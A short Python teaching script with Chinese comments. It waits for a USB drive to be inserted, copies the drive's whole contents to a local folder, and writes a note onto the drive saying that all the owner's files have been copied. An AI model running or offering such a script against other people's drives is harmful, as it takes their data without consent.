"""
1）如何检测有U盘插入；
2）如何复制目录树；
3）如果U盘可写，如何写入新文件。
"""
from time import sleep
from shutil import copytree
from psutil import disk_partitions

while True:
    sleep(1)
    # 检查所有驱动器
    for item in disk_partitions():
        # 发现可移动驱动器
        if 'removable' in item.opts:
            driver, opts = item.device, item.opts
            # 输出可移动驱动器符号
            print('Found USB disk:', driver)
            break

    else:
        print("没有发现可移动硬盘")
        continue
    break

# 复制根目录
copytree(driver, r'D:\usbdriver')
print('warning！！！')

if opts == 'rw,removable':
    print('USB disk writable...')
    # 可写，自动在U盘上创建一个文本文件
    with open(driver+'warning.txt', 'w', encoding='utf8') as fp:
        fp.write('请注意，你的文件已经全部被我复制')
